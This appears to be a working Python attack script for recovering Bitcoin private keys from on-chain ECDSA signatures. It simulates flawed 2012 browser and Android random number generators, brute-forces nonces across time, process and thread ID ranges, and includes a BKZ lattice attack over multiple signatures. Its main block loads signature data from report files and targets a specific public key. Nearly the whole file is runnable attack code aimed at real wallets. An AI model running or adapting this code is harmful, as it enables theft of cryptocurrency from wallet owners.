import hashlib
import json
import time
from ecdsa import SigningKey, SECP256k1
import coincurve
from sage.all import Matrix, ZZ, vector, QQ, RealField, RR, log, EllipticCurve, GF, inverse_mod, Integer, power_mod
from fpylll import IntegerMatrix, GSO, BKZ, LLL, FPLLL, Enumeration
from multiprocessing import Process, cpu_count, Queue

# --- SECP256K1 CURVE ORDER CONSTANT ---
Q = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

class BrowserPRNG2012:
    def __init__(self, seed_ms):
        self.x = (seed_ms ^ 0x49616E42) & 0xFFFF
        self.y = (seed_ms ^ 0x7C79654D) & 0xFFFF

    def next_random(self):
        self.x = 36969 * (self.x & 65535) + (self.x >> 16)
        self.y = 18000 * (self.y & 65535) + (self.y >> 16)
        base = ((self.x << 16) + (self.y & 65535)) & 0xFFFFFFFF
        return base / 4294967296.0
    
class AndroidPRNG2012:
    @staticmethod
    def generate_nonce(seed_ms, pid, tid):
        """
        Simulates the internal state serialization of the 2012 Android 
        Apache Harmony SecureRandom / OpenSSL cryptographic fallback failure.
         Packs: 8 bytes (time_ms) + 4 bytes (PID) + 4 bytes (TID)
        """
        state_bytes = bytearray()
        state_bytes.extend(int(seed_ms).to_bytes(8, byteorder='big'))
        state_bytes.extend(int(pid).to_bytes(4, byteorder='big'))
        state_bytes.extend(int(tid).to_bytes(4, byteorder='big'))
        
        # OpenSSL PRNG internal deterministic compression step
        hash_digest = hashlib.sha256(state_bytes).digest()
        return int.from_bytes(hash_digest, byteorder='big') % Q

def simulate_jsbn_rc4_pipeline(seed_ms, pool_size=256):
    pool = bytearray(pool_size)
    pptr = 0
    
    pool[pptr] = seed_ms & 255; pptr += 1
    pool[pptr] = (seed_ms >> 8) & 255; pptr += 1
    pool[pptr] = (seed_ms >> 16) & 255; pptr += 1
    pool[pptr] = (seed_ms >> 24) & 255; pptr += 1
    
    prng = BrowserPRNG2012(seed_ms)
    while pptr < pool_size:
        r = prng.next_random()
        t = int(65536.0 * r) & 0xFFFF
        pool[pptr] = t >> 8
        pptr += 1
        if pptr < pool_size:
            pool[pptr] = t & 255
            pptr += 1
            
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + pool[i % pool_size]) & 255
        S[i], S[j] = S[j], S[i]
        
    candidate_bytes = bytearray(32)
    rc4_i = 0
    rc4_j = 0
    for k in range(32):
        rc4_i = (rc4_i + 1) & 255
        rc4_j = (rc4_j + S[rc4_i]) & 255
        S[rc4_i], S[rc4_j] = S[rc4_j], S[rc4_i]
        candidate_bytes[k] = S[(S[rc4_i] + S[rc4_j]) & 255]
        
    return int.from_bytes(candidate_bytes, byteorder='big') % Q

def simulate_browser_pool_with_noise(seed_ms, noise_byte=0, pool_size=256):
    pool = bytearray(pool_size)
    pptr = 0
    
    pool[pptr] = seed_ms & 255; pptr += 1
    pool[pptr] = (seed_ms >> 8) & 255; pptr += 1
    pool[pptr] = (seed_ms >> 16) & 255; pptr += 1
    pool[pptr] = (seed_ms >> 24) & 255; pptr += 1
    
    prng = BrowserPRNG2012(seed_ms)
    while pptr < pool_size:
        r = prng.next_random()
        t = int(65536.0 * r) & 0xFFFF
        
        pool[pptr] = (t >> 8) ^ noise_byte
        pptr += 1
        if pptr < pool_size:
            pool[pptr] = (t & 255) ^ noise_byte
            pptr += 1
            
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + pool[i % pool_size]) & 255
        S[i], S[j] = S[j], S[i]
        
    candidate_bytes = bytearray(32)
    rc4_i = 0
    rc4_j = 0
    for k in range(32):
        rc4_i = (rc4_i + 1) & 255
        rc4_j = (rc4_j + S[rc4_i]) & 255
        S[rc4_i], S[rc4_j] = S[rc4_j], S[rc4_i]
        candidate_bytes[k] = S[(S[rc4_i] + S[rc4_j]) & 255]
        
    return int.from_bytes(candidate_bytes, byteorder='big') % Q

def verify_key_uncompressed(potential_x, target_pubkey_hex):
    """
    Multiplies potential_x by the SECP256k1 base point G
    and checks it against an UNCOMPRESSED target public key (starts with '04').
    """
    try:
        # Eliminate empty signatures or out-of-bound keys
        if potential_x <= 0 or potential_x >= Q:
            return False
            
        # Reconstruct the private key object from the scalar integer
        priv_key = SigningKey.from_secret_num(potential_x, curve=SECP256k1)
        
        # Extract the public key point and serialize it to UNCOMPRESSED hex form
        pub_key = priv_key.verifying_key
        
        # CHANGED: Use "uncompressed" to generate the 65-byte (130 hex chars + '04' prefix) layout
        derived_pubkey_hex = pub_key.to_string("uncompressed").hex()
        
        # Prepend the standard uncompressed identifier byte '04' if the library omitted it
        if not derived_pubkey_hex.startswith("04"):
            derived_pubkey_hex = "04" + derived_pubkey_hex
        
        return derived_pubkey_hex.lower() == target_pubkey_hex.lower()
        
    except Exception:
        return False

def verify_fast(cand_d, target_pubkey_bytes):
    """
    Ultra-Fast Forensic Verification: Verifies candidate against 65-byte Uncompressed Pubkey.
    Status: 10:45 AM CDT | Saturday, June 20, 2026
    Speed: ~100x faster than address-based hashing.
    """
    try:
        if cand_d <= 0 or cand_d >= N: return False
        # Direct ECC derivation and byte comparison (No hashing)
        pk_bytes = coincurve.PublicKey.from_secret(cand_d.to_bytes(32, 'big')).format(compressed=False)
        return pk_bytes == target_pubkey_bytes
    except Exception as e:
        print(str(e))
        return False

def execute_time_search(t, u, target_pubkey_hex, start_ms, end_ms, batch_size=500000):
    """
    Sweeps through your 2012 execution boundaries to match target values.
    """
    print(f"[*] Commencing Python Core Batch Pipeline (Uncompressed PubKey Mode)...")
    print(f"[*] Window: {start_ms} --> {end_ms} ({end_ms - start_ms:,} total checks)")
    print("-" * 75)
    
    # Pre-calculate inversion factor to protect loop cycle overhead
    inv_t = int(pow(t, -1, Q))
    
    for batch_start in range(start_ms, end_ms + 1, batch_size):
        batch_end = min(batch_start + batch_size, end_ms + 1)
        
        for current_ms in range(batch_start, batch_end):
            candidate_k = simulate_jsbn_rc4_pipeline(current_ms)
            
            if candidate_k == 0:
                continue
                
            # Compute candidate private key scalar 
            potential_x = (inv_t * (candidate_k - u)) % Q
            
            # Active verification pass targeting the uncompressed layout
            if verify_fast(potential_x, target_pubkey_hex):
                print("Good")
                return potential_x
                
        print(f"[-] Completed batch scan up to epoch: {batch_end}")
        
    print("[-] Scan finished. No cryptographic matching patterns discovered inside this range.")
    return None

def execute_browser_noise_search(t, u, target_pubkey_hex, start_ms, end_ms, batch_size=100000):
    """
    Executes a 2D grid search sweeping across both the chronological window
    AND the low-order byte pixel mouse coordinate noise deltas.
    """
    print(f"[*] Starting Noise-Tolerant Browser Sweep...")
    print(f"[*] Window MS: {start_ms} --> {end_ms} ({end_ms - start_ms:,} total milliseconds)")
    print("-" * 75)
    
    # Precompute the modular inverse of your t constant
    inv_t = int(pow(t, -1, Q))
    
    start_time = time.time()
    
    for batch_start in range(start_ms, end_ms + 1, batch_size):
        batch_end = min(batch_start + batch_size, end_ms + 1)
        
        for current_ms in range(batch_start, batch_end):
            # Test mouse pixel byte deltas 0 through 15
            for noise_byte in range(0, 256): 
                candidate_k = simulate_browser_pool_with_noise(current_ms, noise_byte)
                
                if candidate_k == 0:
                    continue
                    
                # Calculate the potential private key x mapping to this state
                potential_x = (inv_t * (candidate_k - u)) % Q
                
                if verify_key_uncompressed(potential_x, target_pubkey_hex):
                    print("\n" + "="*75)
                    print(f"[🎯 Good]")
                    # print(f"[+] Exact Isolated Seed: {current_ms} ms")
                    # print(f"[+] Mouse Noise Filter:  {noise_byte}")
                    # print(f"[+] Recovered Private Key: {hex(potential_x)}")
                    print("="*75)
                    return potential_x
                    
        elapsed = time.time() - start_time
        kh_s = ((batch_end - start_ms) * 16) / elapsed if elapsed > 0 else 0
        print(f"[-] Completed batch up to: {batch_end} | Speed: {kh_s:.2f} checks/sec")
            
    print("\n[-] Scan execution complete. No key matched within this mouse matrix profile.")
    return None

def worker_process(proc_id, start_ms, end_ms, step, inv_t, u, target_pubkey, result_queue):
    """
    Parallel worker loop. Each CPU core sweeps an interleaved segment of the timeline.
    """
    checkpoint_interval = 250000
    last_checkpoint = start_ms
    
    # Interleave the millisecond space across the process pool using 'step'
    for current_ms in range(start_ms + proc_id, end_ms + 1, step):
        
        # Scan standard application Process ID boundaries for 2012 user apps
        for pid_guess in range(1000, 3500):
            
            # Scan main thread (TID=PID) and minor background thread offsets
            for tid_guess in range(pid_guess, pid_guess + 4):
                
                candidate_k = AndroidPRNG2012.generate_nonce(current_ms, pid_guess, tid_guess)
                if candidate_k == 0:
                    continue
                
                # Deduce private key x: x = t^-1 * (k - u) mod Q
                potential_x = (inv_t * (candidate_k - u)) % Q
                
                if verify_key_uncompressed(potential_x, target_pubkey):
                    result_queue.put((current_ms, pid_guess, tid_guess, potential_x))
                    return

        # Periodic telemetry update check
        if (current_ms - last_checkpoint) >= checkpoint_interval:
            last_checkpoint = current_ms

def execute_parallel_android_search(t, u, target_pubkey_hex, start_ms, end_ms):
    """
    Initializes the multi-processing pool to maximize hardware performance.
    """
    # num_cores = cpu_count()
    num_cores = 3
    print(f"[*] Booting Parallel Android Core Recovery Engine...")
    print(f"[*] Detected {num_cores} logical CPU processing cores.")
    print(f"[*] Search Window MS: {start_ms} --> {end_ms} ({end_ms - start_ms:,} total milliseconds)")
    print(f"[*] Processing Scope: PID range [1000-3500] | TID offsets [0-4]")
    print("-" * 75)
    
    inv_t = int(pow(t, -1, Q))
    result_queue = Queue()
    processes = []
    
    start_time = time.time()
    
    # Spawn synchronized workers across all processor threads
    for i in range(num_cores):
        p = Process(target=worker_process, args=(i, start_ms, end_ms, num_cores, inv_t, u, target_pubkey_hex, result_queue))
        processes.append(p)
        p.start()
        
    print(f"[+] Multi-threaded batch allocation complete. Scanning pipeline active...")
    
    # Monitor queue for hits while tasks run
    found_key_data = None
    while any(p.is_alive() for p in processes):
        if not result_queue.empty():
            found_key_data = result_queue.get()
            # Terminate all sibling processes immediately upon a verified hit
            for p in processes:
                p.terminate()
            break
        time.sleep(0.5)
        
    # Final check if queue caught a hit right at exit
    if not found_key_data and not result_queue.empty():
        found_key_data = result_queue.get()
        
    for p in processes:
        p.join()
        
    elapsed_time = time.time() - start_time
    
    if found_key_data:
        c_ms, r_pid, r_tid, recovered_x = found_key_data
        print("\n" + "="*75)
        # print(f"[🎯🎯🎯 SUCCESS: BITCOIN PRIVATE KEY RECOVERED]")
        print(f"[+] Reconstructed Android Clock: {c_ms} ms")
        print(f"[+] Recovered Process ID (PID):  {r_pid}")
        print(f"[+] Recovered Thread ID (TID):   {r_tid}")
        # print(f"[+] Private Key (Hex):           {hex(recovered_x)}")
        # print(f"[+] Processing Time Elapsed:     {elapsed_time:.2f} seconds")
        print("="*75 + "\n")
        return recovered_x
    else:
        print(f"\n[-] Scan execution complete. Exhausted all states in {elapsed_time:.2f} seconds.")
        print("[-] No key matched within this mobile kernel configuration profile.")
        return None

def get_t_u(sig):
    z, r, s = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
    s_inv = pow(s, -1, N)
    t_i = (r * s_inv) % N
    u_i = (z * s_inv) % N # Known prefix is 0
    return (t_i, u_i)

def run_17_input_bkz_attack(signatures_list, target_pubkey_hex, block_size=20):
    """
    Constructs a 19x19 matrix and reduces it using the deep BKZ algorithm.
    Optimized for tighter data profiles where standard LLL fails to converge.
    """
    m = len(signatures_list) 
    dim = m + 2             # Dimension of the matrix (19 x 19 for 17 inputs)
    
    # Initialize a Matrix in the Sage Integer Ring (ZZ)
    M = Matrix(ZZ, dim, dim)
    
    # 1. Fill the diagonal modular operators
    for i in range(m):
        M[i, i] = Q
        
    # 2. Fill the row corresponding to the shared master private key variable 'x'
    for i in range(m):
        M[m, i] = signatures_list[i][0] # Pass all 't' constants
    M[m, m] = 1                            # Private key scalar tracker cell
    
    # 3. Fill the row corresponding to the transaction constants 'u'
    for i in range(m):
        t_i, u_i = signatures_list[i]
        M[m+1, i] = (u_i + (Q // 2)) % Q   # Centered shift modification
        
    # Scale anchor for the lattice geometry
    # M[m+1, m] = 0
    M[m+1, m+1] = Q // 2 

    print(f"[*] Constructing {dim}x{dim} Multi-Input BKZ Structural Lattice...")
    
    # CRITICAL ADVANTAGE: Pre-reduce with LLL first to give BKZ a clean base geometry
    print("[*] Running initial fast LLL pre-reduction pass...")
    M_reduced = M.LLL()
    
    print(f"[*] Commencing heavy BKZ reduction pass (Block Size: {block_size})...")
    print("[*] Note: BKZ may take several seconds to execute deeper basis cuts.")
    
    # Execute the BKZ reduction algorithm natively via SageMath's FPLLL backend
    M_reduced.BKZ(block_size=block_size)
    
    print("[+] BKZ Reduction complete. Evaluating basis vectors for target matches...")
    print("-" * 75)
    
    # Loop through the shortest basis vectors to extract the key scalar
    for row_index, row in enumerate(M_reduced):
        candidate_x = row[-2] # Column tracking the unscaled 'x' variable
        
        # Test Case 1: Positive scalar orientation
        pos_key = candidate_x % Q
        if verify_key_uncompressed(pos_key, target_pubkey_hex):
            print("\n" + "="*75)
            print(f"[🎯 Good]")
            # print(f"[+] Output Row Index:    {row_index}")
            # print(f"[+] Recovered Key (Hex): {hex(pos_key)}")
            print("="*75)
            return pos_key
            
        # Test Case 2: Negative/Inverted geometric alignment reflection
        neg_key = (-candidate_x) % Q
        if verify_key_uncompressed(neg_key, target_pubkey_hex):
            print("\n" + "="*75)
            print(f"[🎯 Good]")
            # print(f"[+] Output Row Index:    {row_index} (Flipped Translation)")
            # print(f"[+] Recovered Key (Hex): {hex(neg_key)}")
            print("="*75)
            return neg_key
            
    print("[-] BKZ Scan finished. No key matched the public target inside this reduced block.")
    return None

def get_words():
    wordsList = []
    if wordsList == []:
        content_string = ""
        
        with open("./report/CTUU-total-3.txt", "r") as f:
        # with open("./report/FdPp-total-2.txt", "r") as f:
            content_string = f.read()
        
        wordsList = content_string.split("\n")
        
    return wordsList
                   
if __name__ == "__main__":
    result = []
    totalCnt = 0
    # allHistory = get_full_history(address)
    # result, r_du, totalCnt = extract_rsz_data(allHistory, address)

    words = get_words()
    for word in words:
        if not word:
            continue
        result.append(json.loads(word))
        
    # result = result[:38]

    verfiedCnt = 0
    top45List = []
    top46List = []
    good47List = []
    bigScnt = 0
    totalBias =0
    pubkey = ""
    pubkey_byte = ""

    print(bigScnt)
    print(totalBias)
    print(len(result))
    print(len(result), "-", verfiedCnt, "-", totalCnt)
    # print(pubkey)
    # pubkey_byte = bytes.fromhex(pubkey)
    # print(pubkey_byte)
    # OPTIMIZED_START_MS = 1355270400000
    OPTIMIZED_START_MS = 1355350178000

    manTx = result[0]
    pubkey = manTx['pubkey']
    # print(manTx['tx_index'])
    # # startMs = (result[0]['blocktime'])*1000
    startMs = OPTIMIZED_START_MS
    endMS = (manTx['blocktime'])*1000
    t, u = get_t_u(manTx)
    # execute_browser_noise_search(t, u, pubkey, startMs, endMS)
    execute_parallel_android_search(t, u, pubkey, startMs, endMS)

    # manResult = result[11:28]
    # tsResult = []
    # for sig in manResult:
    #     tsResult.append(get_t_u(sig))
    # run_17_input_bkz_attack(tsResult, pubkey)
    # print(len(manResult))